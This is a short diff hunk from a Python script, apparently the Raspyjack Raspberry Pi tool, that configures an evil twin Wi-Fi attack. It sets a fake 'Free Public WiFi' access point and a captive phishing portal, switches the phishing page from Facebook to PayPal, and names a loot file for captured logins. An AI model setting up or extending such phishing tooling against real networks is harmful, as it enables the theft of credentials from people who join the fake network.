@@ -44,21 +44,21 @@ from PIL import Image, ImageDraw, ImageFont
 WIFI_INTERFACE = "wlan1" # Hardcoded to wlan1 as per user request for evil twin attacks
 FAKE_AP_SSID = "Free Public WiFi"
 FAKE_AP_CHANNEL = "1"
-RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
-CAPTIVE_PORTAL_BASE_PATH = os.path.join(RASPYJACK_DIR, "DNSSpoof", "sites")
-CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "phish_facebook")
+CAPTIVE_PORTAL_BASE_PATH = "/root/Raspyjack/DNSSpoof/sites"
+CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "paypal")
 LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
 TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin_facebook/"
 
-current_html_file = "phish_facebook"
+current_html_file = "paypal"
 html_files_list = []
 html_file_index = 0
 
-PINS = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19 }
+PINS = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
 GPIO.setmode(GPIO.BCM)
 for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
 LCD = LCD_1in44.LCD()
 LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
+WIDTH, HEIGHT = 128, 128
 FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
 FONT = ImageFont.load_default()
 
